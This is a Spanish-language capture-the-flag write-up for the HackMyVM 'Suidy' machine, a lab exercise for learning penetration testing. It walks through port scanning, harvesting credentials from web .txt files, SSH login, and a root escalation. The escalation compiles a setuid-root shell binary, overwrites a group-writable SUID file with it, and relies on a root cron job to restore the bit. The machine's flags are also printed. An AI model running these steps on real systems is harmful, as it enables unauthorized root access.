# 🖥️ Suidy - HackMyVM

> **Dificultad:** Easy  
> **OS:** Debian (Buster)  
> **IP:** 192.168.0.10  
> **Fecha:** 2026-05-02

---

## 📡 Reconocimiento

```bash
sudo arp-scan -l
nmap -p- --open -sS --min-rate 5000 -n -Pn 192.168.0.10 -oG allPorts
nmap -sCV -p22,80 192.168.0.10 -oN targeted
```

**Puertos abiertos:**
| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 7.9p1 Debian |
| 80/tcp | HTTP | nginx 1.14.2 |

---

## 🌐 Enumeración Web

```bash
whatweb http://192.168.0.10
gobuster dir -u http://192.168.0.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak -t 40
```

**Hallazgos:**
- `index.html` → contenido: `hi` + comentario `<!-- hi again -->`
- `robots.txt` → tres entradas:
  - `/hi` (404)
  - `/....\..\.-\--.\.-\..\-.` → Morse = **HIAGAIN**
  - `/shehatesme` → directorio con credenciales

### /shehatesme

```bash
curl -sL http://192.168.0.10/shehatesme/
```

> "I put in this directory a lot of .txt files. ONE of .txt files contains credentials like theuser/thepass"

Gobuster encontró ~34 archivos `.txt` de 16 bytes. Script para leer todos:

```python
import urllib.request
files = ["full","about","search","privacy","blog","new","page","forums",
         "jobs","other","welcome","admin","faqs","2001","link","space",
         "network","google","folder","java","issues","guide","es","art",
         "smilies","airport","secret","procps","pynfo","lh2","muze",
         "alba","cymru","wha"]
for f in files:
    c = urllib.request.urlopen(f"http://192.168.0.10/shehatesme/{f}.txt").read().decode().strip()
    print(f"{f}.txt => {c}")
```

**Credenciales reales** (en `procps.txt`, literalmente el ejemplo del enunciado):

```
theuser / thepass
```

---

## 🔑 Acceso Inicial

```bash
ssh theuser@192.168.0.10
# password: thepass
```

**Flag user:** `HMV2353IVI` (en `/home/theuser/user.txt`)

---

## 🔺 Escalada de Privilegios

### Enumeración

```bash
find / -perm -4000 -type f 2>/dev/null
cat /etc/passwd | grep -v nologin
```

**SUID destacado:**
```
-rwsrwsr-x 1 root theuser 16704 /home/suidy/suidyyyyy
```

- Propietario: `root`
- Grupo: `theuser` con **bit de escritura**
- El binario llama a `setuid(suidy)` + `system("/bin/bash")` → shell como `suidy`

### Cron de root

```bash
# Verificado con pspy64 - se ejecuta cada minuto:
sh /root/timer.sh   # Restaura SUID en suidyyyyy
```

### Exploit

Desde `theuser` (sin ejecutar suidyyyyy), compilar binario malicioso y sobreescribir **en sitio** el SUID root:

```bash
printf '#include <stdlib.h>\n#include <unistd.h>\nint main(){setuid(0);setgid(0);system("/bin/bash");return 0;}' > /tmp/suid.c
gcc /tmp/suid.c -o /tmp/evil
cp /tmp/evil /home/suidy/suidyyyyy
```

El kernel borra el bit SUID al escribir. `timer.sh` lo restaura al minuto. Con el binario malicioso ya SUID root:

```bash
/home/suidy/suidyyyyy
whoami   # root
```

> ⚠️ **CRÍTICO**: No ejecutar `suidyyyyy` antes de copiar. Si se ejecuta, el fichero queda "text busy" y no se puede sobrescribir.

**Flag root:** `HMV0000EVE` (en `/root/root.txt`)

---

## 📋 Resumen

| Fase | Técnica |
|------|---------|
| Reconocimiento | nmap, arp-scan |
| Enumeración web | gobuster, robots.txt, Morse en robots |
| Acceso inicial | Credenciales en ficheros .txt (theuser/thepass) |
| Escalada | SUID con group-write + cron root restaura SUID |
